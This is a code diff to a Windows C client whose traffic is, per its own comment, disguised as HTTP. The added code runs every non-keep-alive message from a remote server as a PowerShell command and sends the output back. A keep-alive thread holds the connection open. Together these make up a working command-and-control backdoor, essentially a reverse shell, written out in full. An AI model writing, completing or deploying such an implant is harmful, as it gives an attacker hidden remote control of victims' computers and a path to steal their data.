@@ -28,6 +28,19 @@ static void encrypt(char* plainText) {
 
     // Replace the the plain text with the cipher text
     strcpy_s(plainText, 1024, newString);
+
+    // Free teh memory allocated to newString
+    free(newString);
+}
+
+void sendKeepAlive(SOCKET clientSocket) {
+    // Every 30 seconds, send a KEEP_ALIVE message to the server, to keep the socket open
+    while (1) {
+        char keepAlive[] = "KEEP_ALIVE";
+        encrypt(keepAlive);
+        Sleep(30000);
+        send(clientSocket, keepAlive, strnlen(keepAlive, 11), 0);
+    }
 }
 
 int main(void) {
@@ -41,7 +54,6 @@ int main(void) {
 
     char serverMessage[1024];
     for (int i = 0; i < 1024; i++) serverMessage[i] = '\0';
-    //int bytesRead;
 
     // Create socket
     clientSocket = socket(AF_INET, SOCK_STREAM, 0);
@@ -109,11 +121,16 @@ int main(void) {
     // Free the linked list
     freeaddrinfo(res);
 
+    // Start a thread to send a keep alive message every 30 seconds to the Server
+    thread = _beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);
+
     while (1) {
         // Get message from Server
-        int bytesRead = recv(clientSocket, serverMessage, 1024, 0);
+        int bytesRead = recv(clientSocket, serverMessage, 1023, 0);
         int junk = getchar(); // clearout \n
         serverMessage[bytesRead] = '\0';
+
+        printf("Server sent: %s\n", serverMessage);
 
         // Because the Connecttion is disguised in HTTP, there are a handful of headers we don't care about.
         const char* httpOK = "HTTP/1.1 200 OK";
@@ -124,10 +141,32 @@ int main(void) {
             const char* keepAlive = "KEEP_ALIVE";
             // Check to make sure the message isn't a keep alive message
             if (strncmp(serverMessage, keepAlive, 11) != 0) {
-                // TODO Execute Command
+                // Create the string to run the command in the format "Powershell.exe -Command /"[cmdlet]/"
+                char command[1100] = "Powershell.exe -Command \"";
+                strcat_s(command, rsize_t(1100), serverMessage);
+                strcat_s(command, rsize_t(1100), "\"");
+                
+                // Create variables to run and store command output
+                char commandOutput[8192];
+                FILE* pipe;
+
+                // Open the command for reading
+                pipe = _popen(command, "r");
+                if (pipe == NULL) {
+                    printf("Error opening pipe.\n");
+                    return 1;
+                }
+
+                // Read the output a line and send it back to the Server
+                while (fgets(commandOutput, 8192, pipe) != NULL) {
+                    printf("%s", commandOutput);
+                    send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
+                }
+
+                // Close the pipe
+                _pclose(pipe);
             }
         }
-        printf("Server sent: %s\n", serverMessage);
     }
 
     // Close client socket
